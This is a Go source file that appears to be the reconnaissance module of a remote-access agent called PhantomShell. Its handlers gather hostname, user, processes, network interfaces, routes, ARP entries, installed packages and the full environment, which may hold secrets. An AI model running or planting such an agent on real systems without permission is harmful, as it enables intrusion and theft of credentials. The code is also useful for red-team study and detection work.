package modules

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

func RegisterRecon(d *core.Dispatcher, exec *core.Executor) {
	d.Register("sysinfo", handleSysinfo)
	d.Register("ifconfig", handleInterfaces)
	d.Register("ps", handleProcessList(exec))
	d.Register("env", handleEnvVars)
	d.Register("route", handleRoute(exec))
	d.Register("arp", handleArp(exec))
	d.Register("packages", handlePackages(exec))
}

func handleSysinfo(args map[string]interface{}) map[string]interface{} {
	hostname, _ := os.Hostname()
	u, _ := user.Current()
	username := ""
	uid := ""
	if u != nil {
		username = u.Username
		uid = u.Uid
	}

	cwd, _ := os.Getwd()

	info := map[string]interface{}{
		"hostname": hostname,
		"username": username,
		"uid":      uid,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"pid":      os.Getpid(),
		"ppid":     os.Getppid(),
		"cwd":      cwd,
		"numcpu":   runtime.NumCPU(),
		"gover":    runtime.Version(),
	}
	return map[string]interface{}{"status": "success", "data": info}
}

func handleInterfaces(args map[string]interface{}) map[string]interface{} {
	ifaces, err := net.Interfaces()
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}

	var results []map[string]interface{}
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		addrStrs := make([]string, 0, len(addrs))
		for _, a := range addrs {
			addrStrs = append(addrStrs, a.String())
		}

		results = append(results, map[string]interface{}{
			"name":  iface.Name,
			"mac":   iface.HardwareAddr.String(),
			"flags": iface.Flags.String(),
			"mtu":   iface.MTU,
			"addrs": addrStrs,
		})
	}
	return map[string]interface{}{"status": "success", "data": results}
}

func handleProcessList(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		var cmd string
		if runtime.GOOS == "windows" {
			cmd = "tasklist /FO CSV /NH"
		} else {
			cmd = "ps aux --no-headers 2>/dev/null || ps aux"
		}
		stdout, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}

		lines := strings.Split(strings.TrimSpace(stdout), "\n")
		var procs []map[string]string
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if runtime.GOOS == "windows" {
				// CSV: "name","pid","session","session#","mem"
				parts := strings.Split(line, "\",\"")
				if len(parts) >= 2 {
					procs = append(procs, map[string]string{
						"name": strings.Trim(parts[0], "\""),
						"pid":  strings.Trim(parts[1], "\""),
					})
				}
			} else {
				fields := strings.Fields(line)
				if len(fields) >= 11 {
					procs = append(procs, map[string]string{
						"user":    fields[0],
						"pid":     fields[1],
						"cpu":     fields[2],
						"mem":     fields[3],
						"command": strings.Join(fields[10:], " "),
					})
				}
			}
		}
		return map[string]interface{}{"status": "success", "data": procs}
	}
}

func handleEnvVars(args map[string]interface{}) map[string]interface{} {
	envs := os.Environ()
	envMap := make(map[string]string, len(envs))
	for _, e := range envs {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) == 2 {
			envMap[parts[0]] = parts[1]
		}
	}
	return map[string]interface{}{"status": "success", "data": envMap}
}

func handleRoute(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		var cmd string
		if runtime.GOOS == "windows" {
			cmd = "route print"
		} else if runtime.GOOS == "darwin" {
			cmd = "netstat -rn"
		} else {
			cmd = "ip route 2>/dev/null || route -n"
		}
		stdout, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}
		return map[string]interface{}{"status": "success", "data": stdout}
	}
}

func handleArp(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		var cmd string
		if runtime.GOOS == "windows" {
			cmd = "arp -a"
		} else {
			cmd = "ip neigh 2>/dev/null || arp -an"
		}
		stdout, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}

		lines := strings.Split(strings.TrimSpace(stdout), "\n")
		var entries []map[string]string
		for _, line := range lines {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				entries = append(entries, map[string]string{
					"ip":  fields[0],
					"mac": fields[len(fields)-2],
					"raw": line,
				})
			}
		}
		return map[string]interface{}{"status": "success", "data": entries}
	}
}

func handlePackages(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		var cmd string
		switch runtime.GOOS {
		case "windows":
			cmd = `wmic product get name,version /format:csv 2>nul`
		case "darwin":
			cmd = "brew list --versions 2>/dev/null || pkgutil --pkgs"
		default:
			// Try dpkg first, then rpm
			cmd = "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null || pacman -Q 2>/dev/null"
		}
		stdout, stderr, code := exec.Run(cmd, 0)
		if code != 0 && stdout == "" {
			return map[string]interface{}{"status": "error", "error": fmt.Sprintf("exit %d: %s", code, stderr)}
		}
		return map[string]interface{}{"status": "success", "data": stdout}
	}
}
